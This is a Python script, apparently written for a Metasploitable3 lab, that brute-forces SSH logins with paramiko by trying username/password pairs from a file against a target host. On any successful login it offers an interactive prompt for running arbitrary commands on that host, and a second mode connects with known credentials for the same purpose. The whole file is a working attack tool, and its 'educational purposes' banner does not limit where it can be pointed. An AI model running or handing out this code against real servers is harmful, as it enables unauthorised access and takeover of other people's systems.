import paramiko
import time
import sys
from datetime import datetime

def execute_command(ssh, command):
    """Execute a command on the remote system and return the output"""
    try:
        stdin, stdout, stderr = ssh.exec_command(command)
        output = stdout.read().decode().strip()
        error = stderr.read().decode().strip()

        if error:
            print(f"[!] Error executing command: {error}")
            return None
        return output
    except Exception as e:
        print(f"[!] Error executing command: {str(e)}")
        return None

def ssh_bruteforce(hostname, credentials_file):
    # Banner
    print("=" * 50)
    print("SSH Brute Force Script - For Educational Purposes Only")
    print("Target: " + hostname)
    print("Started at: " + str(datetime.now()))
    print("=" * 50)

    # Read credentials from file
    try:
        with open(credentials_file, 'r') as f:
            credentials = [line.strip().split() for line in f]
    except FileNotFoundError:
        print("[!] Error: Credentials file not found!")
        sys.exit(1)
    except Exception as e:
        print(f"[!] Error reading credentials file: {str(e)}")
        sys.exit(1)

    # Initialize SSH client
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    found_credentials = []
    attempts = 0

    print("\n[*] Starting brute force attack...")
    start_time = time.time()

    # Try each credential pair
    for cred in credentials:
        if len(cred) != 2:
            print(f"\n[!] Warning: Skipping invalid line in credentials file")
            continue

        username, password = cred
        attempts += 1

        try:
            print(f"\r[*] Attempt {attempts}: Testing {username}:{password}", end='')

            # Try to connect
            ssh.connect(hostname, username=username, password=password, timeout=5)

            # If successful, store the credentials
            print(f"\n[+] Success! Valid credentials found:")
            print(f"    Username: {username}")
            print(f"    Password: {password}")

            # Store the successful credentials
            found_credentials.append((username, password))

            # Ask if user wants to execute more commands
            while True:
                choice = input("\n[?] Do you want to execute a command? (y/n): ").lower()
                if choice == 'y':
                    command = input("[+] Enter command to execute: ")
                    output = execute_command(ssh, command)
                    if output:
                        print(f"\n[+] Command output:\n{output}")
                elif choice == 'n':
                    break

            # Close the connection
            ssh.close()

        except paramiko.AuthenticationException:
            # Failed authentication
            ssh.close()
            continue
        except paramiko.SSHException:
            print("\n[!] Error: SSH exception occurred. Waiting 60 seconds...")
            time.sleep(60)
            continue
        except Exception as e:
            print(f"\n[!] Error: {str(e)}")
            continue

    # Print summary
    end_time = time.time()
    duration = end_time - start_time

    print("\n" + "=" * 50)
    print("Attack Summary:")
    print(f"Total attempts: {attempts}")
    print(f"Duration: {duration:.2f} seconds")
    print(f"Valid credentials found: {len(found_credentials)}")

    if found_credentials:
        print("\nValid Credentials:")
        for username, password in found_credentials:
            print(f"Username: {username} | Password: {password}")

    print("=" * 50)

def connect_with_credentials(hostname, username, password):
    """Function to directly connect with known credentials"""
    print(f"\n[*] Attempting to connect to {hostname} with {username}")

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        ssh.connect(hostname, username=username, password=password, timeout=5)
        print("[+] Successfully connected!")


        # Interactive command execution
        while True:
            choice = input("\n[?] Do you want to execute a command? (y/n): ").lower()
            if choice == 'y':
                command = input("[+] Enter command to execute: ")
                output = execute_command(ssh, command)
                if output:
                    print(f"\n[+] Command output:\n{output}")
            elif choice == 'n':
                break

        ssh.close()
        print("\n[*] Connection closed.")

    except Exception as e:
        print(f"[!] Error connecting: {str(e)}")

if __name__ == "__main__":
    # Configuration
    TARGET_HOST = "10.0.2.15"  # Replace with Metasploitable3 IP
    CREDENTIALS_FILE = "/home/kali/Documents/userpass.txt"  # File containing username password pairs

    # Ask user for mode
    print("1. Brute force attack")
    print("2. Connect with known credentials")
    mode = input("Select mode (1/2): ")

    if mode == "1":
        ssh_bruteforce(TARGET_HOST, CREDENTIALS_FILE)
    elif mode == "2":
        username = input("Enter username: ")
        password = input("Enter password: ")
        connect_with_credentials(TARGET_HOST, username, password)
    else:
        print("[!] Invalid mode selected")
